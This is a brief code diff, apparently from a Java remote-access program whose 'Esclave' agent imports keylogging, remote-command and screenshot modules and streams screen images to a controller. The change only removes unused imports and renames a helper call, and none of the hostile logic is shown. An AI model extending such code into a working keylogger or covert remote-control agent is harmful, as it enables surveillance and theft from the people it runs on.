@@ -8,14 +8,12 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.InetAddress;
 import java.net.Socket;
-import java.net.UnknownHostException;
 
 import remote.action.CMD;
 import remote.action.Keylogging;
 import remote.action.Notification;
 import remote.action.RemoteActions;
 import remote.action.ScreenShot;
-import send.specific.object.SendImage;
 import send.specific.object.SendSpecificObject;
 import constante.Constante;
 
@@ -190,7 +188,7 @@ public class Esclave {
 										_out.writeObject(Constante.code_vnc);
 										_out.flush();
 										// System.out.println("[debug] Envoi image");
-										SendImage.sendImage(_out, size,
+										SendSpecificObject.sendImage(_out, size,
 												(byte[]) result);
 									}
 								}
